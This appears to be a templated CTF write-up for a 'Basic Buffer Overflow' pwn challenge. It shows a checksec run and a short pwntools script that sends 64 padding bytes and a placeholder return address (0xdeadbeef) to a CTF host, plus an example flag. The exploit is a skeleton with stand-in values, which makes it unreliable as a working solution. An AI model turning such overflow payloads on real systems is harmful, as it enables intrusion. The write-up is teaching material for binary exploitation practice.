---
title: "Basic Buffer Overflow - CTF Example 2024"
description: "Exploit a classic buffer overflow to achieve arbitrary code execution."
ctfName: "CTF Example 2024"
category: "pwn"
difficulty: "medium"
points: 250
pubDate: 2024-11-01
heroImage: "/images/ctf/default-ctf.png"
tags: ["pwn", "buffer-overflow", "binary-exploitation", "x86"]
language: en
solves: 856
author: "CTF Team"
skillLevel: "intermediate"
estimatedTime: "60-90 minutes"
tools: ["gdb", "pwntools", "python"]
---

# Basic Buffer Overflow - CTF Example 2024

## Description

This challenge presents a binary vulnerable to a classic buffer overflow. The goal is to overwrite the return address to execute arbitrary code.

## Initial Analysis

First we check the binary protections:

```bash
checksec vulnerable_binary
```

Result:
- NX: Disabled
- PIE: No
- Stack Canary: No

## Exploitation

With protections disabled, we can overwrite the return address:

```python
from pwn import *

# Connect to server
p = remote('ctf.example.com', 1337)

# Payload
payload = b'A' * 64
payload += p32(0xdeadbeef)  # Return address

p.sendline(payload)
p.interactive()
```

## Flag

`CTF{example_buff3r_0v3rfl0w_pwn3d}`
